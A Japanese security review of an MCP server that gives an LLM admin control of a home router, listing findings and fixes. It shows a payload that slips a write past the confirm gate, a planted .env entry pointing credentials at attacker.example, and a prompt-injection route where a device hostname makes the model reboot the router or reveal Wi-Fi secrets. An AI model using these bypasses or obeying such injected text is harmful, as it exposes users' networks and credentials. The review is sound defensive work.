## 指摘事項

### [高] 1. raw_request の confirm ゲートを data 経由で回避できる
- **場所**: `src/ax11000_mcp/server.py:385-399`
- **観点**: セキュリティ
- **内容**: ゲートの判定は `operation` 引数だけを見ている。一方、`data` に `operation=` が含まれていると自動付与をスキップし、`data` をそのまま送る。
  そのため `raw_request(path, data="operation=write&...")` と呼ぶと、`operation` は既定値の `read` のままゲートを通過し、書き込みリクエストが送られる。
  モッククライアントで再現済み（`SENT admin/nat?form=dmz 'operation=write&enable=on'`）。
  `TypeError` 時のフォールバック `req(path, data)` も、ゲート判定に使った `body` と異なる値を送っている。
- **推奨される修正**: `data` を `urllib.parse.parse_qsl` で解析し、`operation` 引数とあわせて実際に送る operation を 1 つに決めてから判定する。両方にあって値が違う場合は拒否する。path のクエリ文字列に含まれる `operation=` も同様に判定対象にする。
  ```python
  from urllib.parse import parse_qsl, urlencode

  params = dict(parse_qsl(data, keep_blank_values=True))
  q = dict(parse_qsl(path.partition("?")[2]))
  ops = {v.lower() for v in (params.get("operation"), q.get("operation"), operation) if v}
  if len(ops) > 1:
      return {"ok": False, "error": "operation が矛盾しています"}
  op = ops.pop() if ops else "read"
  if op not in ("read", "load") and not confirm:
      ...
  params["operation"] = op
  body = urlencode(params)
  ```
  回帰テスト（`data` に `operation=write` を入れた場合に confirm を要求すること）を追加する。

### [高] 2. カレントディレクトリの `.env` でルータの接続先を差し替えられ、認証情報が外部へ送られる
- **場所**: `src/ax11000_mcp/config.py:59-62, 91-93`
- **観点**: セキュリティ
- **内容**: 設定の優先度は `~/.config/...` < `./.env` になっている。MCP サーバの cwd は Claude Code を起動したプロジェクトになり得る（README の登録例は `--directory` 指定のため通常はリポジトリだが、他の起動方法では保証されない）。
  信頼できないリポジトリに `ROUTER_HOST=http://attacker.example` だけを書いた `.env` があると、パスワードはユーザー設定から読まれ、host は攻撃者のものに上書きされる。その結果、ルータのログイン処理が認証情報を攻撃者のホストへ送ってしまう。
  `ROUTER_*` は汎用的な名前なので、無関係なプロジェクトの `.env` と偶然衝突する可能性もある。
- **推奨される修正**: `./.env` の読み込みをやめる（または `AX11000_ALLOW_CWD_ENV=1` のような明示的なオプトインにする）。あるいは、host をパスワードと同じ設定元から取るよう、設定元をまとめて扱う。

### [中] 3. エラーメッセージからセッショントークン（stok）が漏れる
- **場所**: `src/ax11000_mcp/server.py:148-153`（および各ツールの `except` で `str(e)` を返す箇所）
- **観点**: セキュリティ
- **内容**: tplinkrouterc6u は URL に `;stok=<token>` を埋め込む（`client/c6u.py` の `request`）。requests のタイムアウトや ConnectionError のメッセージには URL が含まれるため、stok がそのまま LLM のコンテキストに入る。
  マスクしているのはパスワードだけ。logout が失敗した場合、トークンは有効なまま残る。
- **推奨される修正**: `re.sub(r"stok=[^/&\s]+", "stok=***", msg)` を追加する。sysauth などの Cookie 値も同様にマスクする。

### [中] 4. raw_request の非 JSON 応答はマスクされない
- **場所**: `src/ax11000_mcp/server.py:401-405`
- **観点**: セキュリティ
- **内容**: 「戻り値の秘密値は常にマスク」と説明しているが、JSON として解釈できない文字列は `{"raw": j[:8000]}` のまま返す。`psk=...` のような form 形式や HTML の中の秘密値は素通りする。
- **推奨される修正**: `raw` にも `(password|psk|passphrase|secret|token|stok)\s*[=:]\s*\S+` のような正規表現マスクを適用する。または非 JSON は既定で返さず、長さだけ返す。

### [中] 5. confirm は人間による承認にならない（プロンプトインジェクション経路あり）
- **場所**: 書き込み系ツール全般、`list_devices` / `router_overview`
- **観点**: セキュリティ（設計）
- **内容**: `confirm` は LLM 自身が設定する引数なので、誤操作の抑止にはなるが、人間の承認の代わりにはならない。
  一方、`list_devices` の hostname は LAN 内の任意の機器が DHCP で名乗れる、攻撃者が制御できる文字列であり、そのまま LLM のコンテキストに入る。悪意ある hostname に書かれた指示で `reboot_router(confirm=True)` や `get_wifi(reveal_secrets=True)` を実行させる経路が理論上成立する。
- **推奨される修正**: README に「書き込み系ツールと `get_wifi` は Claude Code の permission で都度承認にすること（allow リストに入れない）」と明記する。可能であれば `reveal_secrets` も confirm 相当の扱いにするか、環境変数によるオプトインにする。

### [低] 6. timeout 引数の優先度がドキュメントと食い違う
- **場所**: `src/ax11000_mcp/config.py:100`
- **観点**: 可読性 / 正確性
- **内容**: docstring では「explicit args が最優先」としているが、`timeout` 引数は `pick()` の default に入るだけなので、環境変数や `.env` があると負ける。0 や負の値の検証もない。
- **推奨される修正**: `final_timeout = timeout if timeout is not None else int(pick(...))` とし、`max(1, ...)` などで下限を設ける。

## 総評
構成はシンプルで、ruff とテストもすべて通っている。書き込み系への confirm ゲート、秘密値のマスク、パスワードをマスクしたエラー、`safe_summary` など、安全面への配慮も見える。
ただし **public リポジトリ**であり、ルータの管理権限を LLM に渡すツールである点を踏まえると、指摘 1（confirm ゲートの回避）と指摘 2（cwd の `.env` による接続先の差し替え）は早めに修正すべき。
指摘 3〜5 はマスク処理と運用ドキュメントを補強する内容で、修正コストは小さい。
